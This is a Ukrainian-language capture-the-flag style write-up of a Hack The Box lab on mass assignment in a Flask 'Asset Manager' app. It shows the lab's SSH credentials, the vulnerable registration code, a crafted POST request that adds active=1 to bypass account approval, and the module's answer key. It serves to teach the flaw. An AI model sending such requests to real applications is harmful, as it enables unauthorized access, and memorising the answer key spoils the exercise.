Attacking Common Applications — Web Mass Assignment (Asset Manager)
===================================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Web Mass Assignment Vulnerabilities](https://academy.hackthebox.com/app/module/113/section/2160)
Ціль: `10.129.205.15`
Фінальна відповідь Q1: `active`

Ідея атаки
----------

Є Flask‑додаток "Asset Manager", який:
- дозволяє реєструвати користувачів через `/register`;
- має поле "активності" акаунта, яке не показує користувачу явно;
- це поле налаштовано через пряме читання `request.form['active']` і запис в БД;
- ми можемо мас‑асайнити цей параметр (`active=true`) в своєму реєстраційному запиті й одразу отримати **активний** акаунт, який зможе залогінитись.

Крок 1 — SSH до цілі й пошук коду
---------------------------------

На атакуючій машині:

```bash
ssh root@10.129.205.15
# пароль: !x4;EW[ZLwmDx?=w
```

Після входу:

```bash
cd /opt/asset-manager
ls
# app.py  database.db  static  templates
```

Переглядаємо код:

```bash
cat app.py
```

Це дає повний Flask‑код з роутами `/`, `/login`, `/home`, `/logout`, `/register`, `/profit`.

Крок 2 — Аналіз логіки /register (мас‑асайнмент точка)
------------------------------------------------------

Фокус на функції `register`:

```python
@app.route('/register',methods=['GET','POST'])
def register():
    if request.method=='GET':
        return render_template('index.html')
    else:
        username=request.form['username']
        password=request.form['password']
        try:
            if request.form['active']:
                cond=True
        except:
            cond=False
        with sqlite3.connect("database.db") as con:
            cur = con.cursor()
            cur.execute('select * from users where username=?',(username,))
            if cur.fetchone():
                return render_template('index.html',value='User exists!!')
            else:
                cur.execute('insert into users values(?,?,?)',(username,password,cond))
                con.commit()
                return render_template('index.html',value='Success!!)
```

Важливі моменти:

- параметри з форми читаються напряму через `request.form[...]`;
- ніякого фільтрування/валідації "дозволених" полів;
- блок `try/except` показує, що поле `active` може бути або є, або немає:
  - якщо є → `cond=True`;
  - якщо немає → `cond=False`;
- `cond` записується як третє поле в таблицю `users` разом із `username` і `password`.

Висновок:

- **критичний параметр називається `active`;**
- якщо ми надішлемо POST на `/register` з полем `active` (наприклад, через Burp, curl або змінений HTML‑форм), акаунт буде створено як активний.

Крок 3 — Підготовка експлойту (мас‑асайнмент)
---------------------------------------------

Практичний сценарій (поза питанням Q1, але корисно для нотаток):

1. У браузері відкриваємо сторінку реєстрації (root `/` → форма з username/password).
2. Через Burp (Proxy + Repeater) перехоплюємо POST на `/register`.
3. В тілі запиту додаємо поле `active`:

```http
POST /register HTTP/1.1
Host: 10.129.205.15
Content-Type: application/x-www-form-urlencoded

username=ivan&password=123456&active=1
```

4. Надсилаємо запит — у БД зʼявляється користувач `ivan` з `cond=True`.
5. Потім логінимось через `/login` з тими ж `username`/`password`.

Це класичний **mass assignment**: бекенд бездумно приймає й записує поле `active`, яке не має бути контролюємим користувачем.

Крок 4 — Відповідь для модуля
-----------------------------

Модульна Q1 питає:

> SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.

З коду:

```python
if request.form['active']:
    cond=True
```

Параметр: **`active`**.

Відповідь
---------

**Q1:** What is the parameter name that needs to be manipulated to log in to the Asset Manager web application?  
**A:** `active`

Що тут було вразливим
---------------------

- Прямий bind усіх полів `request.form[...]` до обʼєкта/таблиці без allow‑list.
- Немає розділення між «користувацькими» полями (username/password) і «системними» (active/approved).
- Нападник може додати `active=1` в свій реєстраційний запит і відразу отримати активний акаунт, обходячи механізм «pending for approval».
